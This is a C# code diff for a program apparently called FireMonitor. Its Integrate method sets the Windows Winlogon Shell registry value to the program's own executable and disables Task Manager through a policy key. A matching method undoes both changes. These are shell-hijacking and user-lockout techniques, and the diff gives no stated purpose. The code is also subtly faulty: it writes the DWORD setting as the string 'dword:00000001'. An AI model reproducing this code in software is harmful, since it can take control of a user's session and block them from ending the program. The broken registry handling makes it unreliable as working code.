@@ -6,19 +6,25 @@ namespace FireMonitor
 	{
 		public static void Integrate()
 		{
-			RegistryKey regkey = Registry.LocalMachine.OpenSubKey(@"Software\MyTestRegKey");
-			string[] valnames = regkey.GetValueNames();
-			string val0 = (string)regkey.GetValue(valnames[0]);
-			regkey.SetValue("Domain", (string)"Workgroup");
+			var executablePath = System.Reflection.Assembly.GetEntryAssembly().Location;
+
+			RegistryKey shellRegistryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
+			shellRegistryKey.SetValue("Shell", executablePath);
+
+			RegistryKey taskManagerRegistryKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
+			taskManagerRegistryKey.SetValue("DisableTaskMgr", "dword:00000001");
+
 			Registry.LocalMachine.Flush();
 		}
 
 		public static void Desintegrate()
 		{
-			RegistryKey regkey = Registry.LocalMachine.OpenSubKey(@"Software\MyTestRegKey");
-			string[] valnames = regkey.GetValueNames();
-			string val0 = (string)regkey.GetValue(valnames[0]);
-			regkey.SetValue("Domain", (string)"Workgroup");
+			RegistryKey shellRegistryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
+			shellRegistryKey.SetValue("Shell", "explorer.exe");
+
+			RegistryKey taskManagerRegistryKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
+			taskManagerRegistryKey.SetValue("DisableTaskMgr", "dword:00000000");
+
 			Registry.LocalMachine.Flush();
 		}
 	}
